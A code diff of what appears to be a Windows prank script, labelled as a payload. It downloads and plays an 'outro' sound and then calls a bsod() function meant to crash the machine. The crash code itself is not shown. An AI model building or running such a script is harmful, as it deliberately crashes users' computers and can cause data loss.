@@ -1,12 +1,12 @@
 #---<imports>---
 from ctypes import windll , c_int , c_uint , c_ulong , POINTER , byref
 from requests import get
-from os import path,mkdir,getcwd,system
+from os import path,mkdir,getcwd
 from winsound import PlaySound,SND_ASYNC
 from time import sleep
 
 #---<payload(s)>---
-def get():
+def download():
     depreq = get('https://github.com/CodeSyncio/computer-outro-downloadables/blob/main/outro.wav?raw=true')
     if path.exists('MP3'): pass
     else: mkdir('MP3')
@@ -22,7 +22,7 @@ def play():
      
 #---<start>---
 if __name__ == '__main__':
-    get()
+    download()
     play()
     sleep(11)
     bsod()
